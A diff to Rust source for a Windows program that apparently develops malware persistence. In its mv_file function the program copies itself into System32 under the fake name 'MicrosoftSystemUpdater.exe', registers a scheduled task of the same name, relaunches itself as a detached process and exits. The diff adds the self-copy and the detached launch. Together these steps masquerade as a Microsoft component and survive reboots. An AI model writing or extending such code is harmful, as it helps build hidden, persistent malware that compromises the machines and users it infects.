@@ -1,6 +1,7 @@
 
 use std::convert::identity;
 use std::fs::{self, OpenOptions};
+use std::os::windows::process::CommandExt;
 use std::process;
 use std::sync::Mutex;
 use once_cell::sync::Lazy;
@@ -322,8 +323,9 @@ pub fn mv_file(){
     let curr_file = std::env::current_exe().expect("Can't find");
     let new_file = std::path::Path::new("C:\\Windows\\System32\\MicrosoftSystemUpdater.exe");
     
-    if new_file != curr_file{
-
+    if new_file != curr_file.as_path(){
+        const DETACHED_PROCESS: u32 = 0x00000008;
+        fs::copy(&curr_file, &new_file).expect("Failed to copy to new location");
         let task_name = "MicrosoftSystemUpdater";
 
         let output = std::process::Command::new("schtasks")
@@ -338,7 +340,7 @@ pub fn mv_file(){
         .output()
         .expect("failed to run schtasks");
 
-        std::process::Command::new(new_file).spawn().unwrap();
+        std::process::Command::new(new_file).creation_flags(DETACHED_PROCESS).spawn().unwrap();
 
         std::process::exit(0);
 
